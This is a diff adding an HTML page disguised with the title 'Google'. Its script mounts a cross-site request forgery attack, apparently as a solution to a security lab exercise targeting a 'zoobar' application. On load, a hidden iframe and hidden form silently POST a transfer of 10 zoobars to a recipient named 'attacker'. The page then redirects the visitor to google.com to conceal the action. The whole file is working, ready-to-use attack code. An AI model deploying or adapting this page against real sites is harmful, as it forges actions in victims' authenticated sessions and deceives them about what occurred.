@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Google</title>
+	<meta charset="utf-8">
+</head>
+<body>
+<script type="text/javascript">
+var unique_name = "y50oc8jn0nlvgggg";
+var url = "http://zoobar.org/transfer.php";
+var payload = {"zoobars": "10", "recipient": "attacker", "submission": "Send"};
+var iframe = crossDomainPost(unique_name, url, payload);
+iframe.onload = function() {
+	window.location.replace("https://www.google.com");
+}
+// post
+function crossDomainPost(name, url, payload) {
+    // Add the iframe with a unique name
+    if (document.getElementById(name + "iframe")) {
+        var iframe = document.getElementById(name + "form");
+    } else {
+        var iframe = document.createElement("iframe");
+        iframe.id = name + "iframe";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+        iframe.contentWindow.name = name;
+    }
+
+    if (document.getElementById(name + "form")) {
+        var form = document.getElementById(name + "form");
+    } else {
+        // construct a form with hidden inputs, targeting the iframe
+        var form = document.createElement("form");
+        form.id = name + "form";
+        form.target = name;
+        form.action = url;
+        form.target = name;
+        form.method = "POST";
+        // repeat for each parameter
+        for (var key in payload) {
+            var input = document.createElement("input");
+            input.id = name + "-input-" + key;
+            input.type = "hidden";
+            input.name = key;
+            form.appendChild(input);
+        }
+        document.body.appendChild(form);
+    }
+    for (var key in payload) {
+        var input = document.getElementById(name + "-input-" + key);
+        input.value = payload[key];
+    }
+
+    form.submit();
+    return iframe;
+}
+</script>
+</body>
+</html>
